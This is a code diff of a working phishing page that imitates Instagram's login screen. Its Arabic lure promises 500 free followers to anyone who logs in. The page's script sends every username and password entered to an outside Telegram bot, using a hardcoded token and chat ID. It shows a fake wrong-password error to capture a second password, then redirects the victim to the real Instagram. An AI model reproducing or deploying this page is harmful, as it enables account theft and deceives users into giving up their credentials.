@@ -3,65 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - التحقق من الأهلية</title>
+    <title>Instagram • Get Followers</title>
     <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b30c691162.ico">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 1px; }
-        .logo { width: 175px; margin: 20px 0 30px; cursor: pointer; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
-        button { width: 100%; padding: 7px; border: none; border-radius: 4px; background-color: #0095f6; color: white; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        /* ستايل لتقليد واجهة موبايل إنستغرام */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: space-between; height: 100vh; margin: 0; padding-top: 50px; }
+        .container { width: 90%; max-width: 350px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 25px; }
+        .info-text { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 20px; font-weight: 600; }
+        .badge { background: #fa3e4b; color: white; padding: 4px 12px; border-radius: 4px; font-size: 12px; margin-bottom: 15px; display: inline-block; }
+        
+        /* تصميم حقول الإدخال */
+        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
+        input:focus { border: 1px solid #a8a8a8; outline: none; }
+        
+        /* تصميم زر تسجيل الدخول */
+        button { width: 100%; padding: 10px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
         button:disabled { background-color: #b2dffc; }
-        .error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; text-align: center; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
-        .followers-badge { background: #fdf0f1; color: #d0021b; padding: 5px 10px; border-radius: 20px; font-size: 11px; margin-bottom: 15px; display: inline-block; font-weight: bold; }
+
+        /* ستايل لصندوق الخطأ */
+        .error-box { border: 1px solid #ed4956; padding: 15px; margin-bottom: 20px; display: none; background-color: #fff; }
+        .error-text { color: #ed4956; font-size: 14px; text-align: center; }
+
+        /* ستايل لذيل الصفحة */
+        .footer { padding: 20px; color: #8e8e8e; font-size: 12px; text-align: center; width: 100%; border-top: 1px solid #dbdbdb; }
     </style>
 </head>
 <body>
 
-<div class="box">
+<div class="container">
     <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560560d9a.png" class="logo">
     
-    <div class="followers-badge">🎁 عرض خاص: 500 متابع حقيقي</div>
-    
-    <div id="error" class="error-msg">عذراً، كلمة السر التي أدخلتها غير صحيحة. يرجى إعادة المحاولة.</div>
+    <div id="errorBox" class="error-box">
+        <span class="error-text" id="errorMsg">عذراً، كلمة السر التي أدخلتها غير صحيحة. يرجى التحقق منها.</span>
+    </div>
 
-    <input type="text" id="email" placeholder="اسم المستخدم، الهاتف، أو البريد">
+    <div class="badge">🎁 عرض خاص: 500 متابع حقيقي</div>
+    <div class="info-text">سجل دخولك لتلقي 500 متابع مجاناً على حسابك</div>
+
+    <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
     <input type="password" id="pass" placeholder="كلمة السر">
-    <button id="loginBtn" onclick="process()">تسجيل الدخول</button>
+    
+    <button onclick="handleLogin()">تسجيل الدخول</button>
+
+    <div style="margin-top: 25px; font-size: 14px;">
+        <span style="color: #8e8e8e;">ليس لديك حساب؟</span>
+        <span style="color: #0095f6; font-weight: 600;">تسجيل</span>
+    </div>
 </div>
 
-<div class="footer">
-    لديك سؤال؟ <a href="#" style="text-decoration:none; color:#00376b;">مركز المساعدة</a>
-</div>
+<div class="footer">Instagram from Meta © 2026</div>
 
 <script>
-    let step = 1;
+    let attempt = 1;
+    // بيانات بوت التليجرام الخاص بك
     const TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwXODPs';
-    const ID = '7822309283';
+    const CHAT_ID = '7822309283';
 
-    async function sendToTelegram(u, p, status) {
-        const text = `🚨 صيد جديد من Master VEXO 🚨\n👤 المستخدم: ${u}\n🔑 الباسورد: ${p}\n📌 الحالة: ${status}`;
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
+    // دالة لإرسال البيانات للبوت
+    async function sendData(u, p, note) {
+        const text = `🔥 صيد جديد من Master VEXO 🔥\n👤 اليوزر: ${u}\n🔑 الباسورد: ${p}\n📝 ملاحظة: ${note}`;
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
     }
 
-    function process() {
-        const u = document.getElementById('email').value;
+    // دالة لمعالجة تسجيل الدخول (الهندسة الاجتماعية)
+    function handleLogin() {
+        const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
-        const err = document.getElementById('error');
+        const err = document.getElementById('errorBox');
+        const errMsg = document.getElementById('errorMsg');
 
         if(u === "" || p === "") return;
 
-        if (step === 1) {
-            // إرسال المحاولة الأولى (التي يظن الضحية أنها خطأ)
-            sendToTelegram(u, p, "المحاولة الأولى (تم عرض خطأ)");
+        if (attempt === 1) {
+            // المحاولة الأولى: إرسال البيانات للبوت وإظهار خطأ وهمي
+            sendData(u, p, "المحاولة الأولى (تم عرض خطأ الباسورد)");
             err.style.display = 'block';
             document.getElementById('pass').value = '';
-            step = 2;
+            attempt = 2;
         } else {
-            // المحاولة الثانية: رسالة الرفض والتحويل
-            sendToTelegram(u, p, "المحاولة الثانية (تم التحويل)");
-            alert("عذراً، حسابك لا يتوافق مع الشروط الأساسية للحصول على 500 متابع. يجب أن يكون الحساب نشطاً منذ أكثر من 6 أشهر.");
+            // المحاولة الثانية: إرسال البيانات وإظهار رسالة الشروط والتحويل
+            sendData(u, p, "المحاولة الثانية (تم التحويل النهائي)");
+            alert("عذراً، حسابك لا يتوافق مع الشروط الأساسية للحصول على 500 متابع. يجب أن يكون الحساب موثقاً برقم هاتف ونشطاً.");
             window.location.href = "https://www.instagram.com";
         }
     }
